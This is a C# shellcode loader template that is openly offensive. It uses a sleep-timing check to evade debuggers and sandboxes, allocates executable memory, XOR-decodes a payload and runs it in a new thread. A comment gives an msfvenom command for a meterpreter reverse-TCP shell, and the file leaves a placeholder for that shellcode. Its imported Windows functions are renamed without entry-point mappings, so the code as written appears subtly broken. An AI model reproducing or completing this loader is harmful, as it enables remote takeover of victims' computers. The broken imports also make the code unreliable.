using System.Runtime.InteropServices;
using System;

namespace BasicShellcodeRunner
{
    public class ShellExecutor
    {
        // Constants for memory allocation flags
        // ALLOC_EXECUTE_READWRITE: Memory region is both writable and executable
        private const uint ALLOC_EXECUTE_READWRITE = 0x40;
        // ALLOC_COMMIT_RESERVE: Commit and reserve memory in one step
        private const uint ALLOC_COMMIT_RESERVE = 0x3000;

        // Importing the Sleep function from kernel32.dll to delay execution
        [DllImport("kernel32.dll")]
        private static extern void Sleep(uint milliseconds);

        // Importing VirtualAlloc to allocate memory in the virtual address space of the calling process
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr AllocateMemory(IntPtr address, int size, uint allocationType, uint protectionType);

        // Importing CreateThread to create a new thread for running the shellcode
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr LaunchThread(IntPtr threadAttributes, uint stackSize, IntPtr startAddress, IntPtr parameter, uint creationFlags, uint threadId);

        // Importing WaitForSingleObject to block the calling thread until the specified thread terminates
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int WaitForCompletion(IntPtr handle, int milliseconds);

        public static void Main()
        {
            // Step 1: Add a delay to detect potential debugging
            // Record the start time
            DateTime startTime = DateTime.Now;

            // Pause execution for 10 seconds
            Sleep(10000);

            // Calculate the elapsed time
            double elapsedTime = DateTime.Now.Subtract(startTime).TotalSeconds;

            // Check if elapsed time is less than expected (indicating possible debugging)
            if (elapsedTime < 9.5)
            {
                // If the program is running faster than expected, terminate execution
                return;
            }

            // Step 2: Define and prepare the shellcode
            // The shellcode is generated using msfvenom, and it's XOR-encoded with a key
            // Example msfvenom command:
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp
            byte[] shellPayload = new byte[0] { /* INSERT MSFVENOM SHELLCODE HERE */ };

            // Step 3: Allocate memory for the shellcode
            int payloadLength = shellPayload.Length;

            // Allocate a memory region with read/write/execute permissions
            IntPtr allocatedMemory = AllocateMemory(IntPtr.Zero, payloadLength, ALLOC_COMMIT_RESERVE, ALLOC_EXECUTE_READWRITE);

            // Step 4: Decode the shellcode (XOR decryption with key 0xFA)
            for (int index = 0; index < shellPayload.Length; index++)
            {
                // XOR each byte with the key to decode the payload
                shellPayload[index] = (byte)((uint)shellPayload[index] ^ 0xFA);
            }

            // Step 5: Copy the decoded shellcode into the allocated memory
            Marshal.Copy(shellPayload, 0, allocatedMemory, payloadLength);

            // Step 6: Execute the shellcode by creating a new thread
            // Start a new thread at the memory location where the shellcode is loaded
            IntPtr threadHandle = LaunchThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, 0);

            // Step 7: Wait for the thread to complete execution
            // Block the calling thread indefinitely until the new thread finishes execution
            int threadStatus = WaitForCompletion(threadHandle, -1);

            // The shellcode is now executed, and the thread has completed its task
        }
    }
}
